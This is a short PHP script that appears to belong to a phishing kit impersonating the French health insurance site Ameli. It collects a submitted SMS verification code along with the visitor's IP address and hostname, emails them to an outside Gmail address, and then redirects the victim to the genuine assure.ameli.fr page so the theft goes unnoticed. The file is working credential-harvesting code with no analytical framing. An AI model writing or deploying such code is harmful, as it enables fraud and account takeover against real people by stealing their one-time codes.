<?php
$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);
$message .= "[AML]\n";
$message .= "SMS2      : ".$_POST['o9']."\n";
$message .= "[DON]\n";
$send = "inoxx-inoxxfranck1@gmail.com";
$subject = "DON[SMS2] $ip";
$headers = "From: [AML]<inoxx-inoxxfranck1@gmail.com>";
mail($send,$subject,$message,$headers);
echo '<script language="Javascript">
<!--
document.location.replace("https://assure.ameli.fr/");
// -->
</script>';

?>